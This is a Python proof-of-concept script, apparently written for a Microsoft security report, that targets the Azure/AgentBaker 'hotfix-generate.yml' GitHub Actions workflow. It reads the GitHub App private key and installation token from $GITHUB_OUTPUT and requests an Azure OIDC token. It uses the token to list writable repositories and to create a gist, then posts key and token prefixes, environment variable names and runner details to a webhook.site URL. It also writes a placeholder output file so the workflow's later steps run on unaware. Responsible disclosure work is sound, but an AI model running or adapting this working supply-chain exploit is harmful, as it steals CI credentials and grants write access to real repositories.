#!/usr/bin/env python3
"""
MSRC PoC Payload — Azure/AgentBaker hotfix-generate.yml
POC_ID: ACTIONSTRAIL-POC-20260724-174705-65083
Canary: https://webhook.site/b0080f09-4d78-49dd-825d-ebd485a6dc38

When this file executes inside hotfix-generate.yml (step 5, after azure/login,
azure/cli, and create-github-app-token have all run), it has access to:
  - $GITHUB_OUTPUT: contains App RSA private key + App installation token
  - ACTIONS_ID_TOKEN_REQUEST_URL + _TOKEN: Azure OIDC exchange credentials
  - AZURE_KV_* / ARM_*: Azure subscription identity
"""
import os, json, ssl, urllib.request, urllib.error, base64, subprocess, sys

POC_ID     = "ACTIONSTRAIL-POC-20260724-174705-65083"
CANARY_URL = "https://webhook.site/b0080f09-4d78-49dd-825d-ebd485a6dc38"

ctx = ssl.create_default_context()

def safe_get(url, headers=None, timeout=10):
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read().decode()
    except Exception as e:
        return f"error:{e}"

def safe_post(url, data, headers=None, timeout=10):
    try:
        req = urllib.request.Request(
            url, data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json", **(headers or {})},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read().decode()
    except Exception as e:
        return f"error:{e}"

# ── 1. Read $GITHUB_OUTPUT (App private key + App installation token) ────────
output_file = os.environ.get("GITHUB_OUTPUT", "")
outputs = {}
if output_file and os.path.exists(output_file):
    with open(output_file) as f:
        content = f.read()
    for line in content.splitlines():
        if "=" in line:
            k, _, v = line.partition("=")
            outputs[k.strip()] = v.strip()

app_private_key_escaped = outputs.get("private-key", "")
app_token = outputs.get("token", "")

# Restore PEM from single-line escaped format (\n -> actual newlines)
app_private_key_pem = app_private_key_escaped.replace("\\n", "\n")

# ── 2. Fetch live Azure OIDC token (exchange for Azure access token) ──────────
oidc_jwt = ""
oidc_req_url   = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
oidc_req_token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
if oidc_req_url and oidc_req_token:
    audience_url = f"{oidc_req_url}&audience=api://AzureADTokenExchange"
    raw = safe_get(audience_url, headers={"Authorization": f"Bearer {oidc_req_token}"})
    try:
        oidc_jwt = json.loads(raw).get("value", "")
    except Exception:
        oidc_jwt = raw[:200]

# ── 3. Verify App token scope (which repos can we write to?) ──────────────────
app_token_repos = []
if app_token:
    resp = safe_get(
        "https://api.github.com/installation/repositories?per_page=100",
        headers={"Authorization": f"Bearer {app_token}", "Accept": "application/vnd.github+json"}
    )
    try:
        app_token_repos = [r["full_name"] for r in json.loads(resp).get("repositories", [])]
    except Exception:
        app_token_repos = [f"parse-error: {resp[:100]}"]

# ── 4. Demonstrate App token write access: create a canary gist ───────────────
gist_url = ""
if app_token:
    gist_resp = safe_post(
        "https://api.github.com/gists",
        data={
            "description": f"MSRC AgentBaker PoC — {POC_ID}",
            "public": False,
            "files": {
                "poc-evidence.txt": {
                    "content": (
                        f"POC_ID: {POC_ID}\n"
                        f"FINDING: Azure/AgentBaker hotfix-generate.yml supply chain\n"
                        f"APP_TOKEN_PREFIX: {app_token[:12]}...\n"
                        f"PRIVATE_KEY_PRESENT: {bool(app_private_key_pem)}\n"
                        f"OIDC_TOKEN_PRESENT: {bool(oidc_jwt)}\n"
                        f"APP_WRITABLE_REPOS: {app_token_repos}\n"
                    )
                }
            }
        },
        headers={"Authorization": f"Bearer {app_token}", "Accept": "application/vnd.github+json"}
    )
    try:
        gist_url = json.loads(gist_resp).get("html_url", "")
    except Exception:
        gist_url = gist_resp[:200]

# ── 5. Demonstrate push access to Azure/AgentBaker via App token ──────────────
# Show the App token can list refs on AgentBaker (confirming write scope)
agentbaker_refs = ""
if app_token and "Azure/AgentBaker" in app_token_repos:
    agentbaker_refs = safe_get(
        "https://api.github.com/repos/Azure/AgentBaker/git/refs?per_page=5",
        headers={"Authorization": f"Bearer {app_token}", "Accept": "application/vnd.github+json"}
    )

# ── 6. Collect Azure OIDC environment (subscription identity) ─────────────────
azure_env = {k: v for k, v in os.environ.items()
             if any(k.startswith(p) for p in [
                 "AZURE_", "ARM_", "ACTIONS_ID_TOKEN", "GITHUB_", "RUNNER_"
             ])}
# Redact secret values — show only key presence for canary (full values would be in prod attack)
azure_env_keys = list(azure_env.keys())

# ── 7. Exfiltrate to canary ───────────────────────────────────────────────────
exfil_payload = {
    "poc_id":                   POC_ID,
    "finding":                  "Azure/AgentBaker hotfix-generate.yml contributor privilege escalation",
    "app_token_prefix":         app_token[:20] + "..." if len(app_token) > 20 else app_token,
    "app_token_present":        bool(app_token),
    "app_private_key_present":  bool(app_private_key_pem),
    "app_private_key_prefix":   app_private_key_pem[:60] if app_private_key_pem else "",
    "oidc_jwt_present":         bool(oidc_jwt),
    "oidc_jwt_prefix":          oidc_jwt[:60] if oidc_jwt else "",
    "app_token_repos":          app_token_repos,
    "gist_url":                 gist_url,
    "agentbaker_refs_preview":  agentbaker_refs[:300] if agentbaker_refs else "",
    "azure_env_keys":           azure_env_keys,
    "runner": {
        "hostname":      os.uname().nodename,
        "user":          os.environ.get("USER", ""),
        "github_repo":   os.environ.get("GITHUB_REPOSITORY", ""),
        "github_ref":    os.environ.get("GITHUB_REF", ""),
        "github_sha":    os.environ.get("GITHUB_SHA", ""),
        "github_actor":  os.environ.get("GITHUB_ACTOR", ""),
        "github_run_id": os.environ.get("GITHUB_RUN_ID", ""),
    }
}

canary_result = safe_post(CANARY_URL, data=exfil_payload,
                           headers={"X-POC-ID": POC_ID})

# ── 8. Print evidence markers to workflow logs ────────────────────────────────
print(f"ACTIONSTRAIL-CANARY-SENT:   {POC_ID}")
print(f"APP_TOKEN_PRESENT:          {bool(app_token)}")
print(f"APP_PRIVATE_KEY_PRESENT:    {bool(app_private_key_pem)}")
print(f"OIDC_TOKEN_PRESENT:         {bool(oidc_jwt)}")
print(f"GIST_URL:                   {gist_url}")
print(f"APP_WRITABLE_REPOS:         {app_token_repos}")
print(f"CANARY_RESPONSE:            {canary_result[:100]}")

# ── 9. Write legitimate output (avoid breaking subsequent steps) ──────────────
os.makedirs("parts/linux/cloud-init/artifacts", exist_ok=True)
with open("parts/linux/cloud-init/artifacts/aks-node-controller-hotfix.json", "w") as f:
    json.dump({}, f)
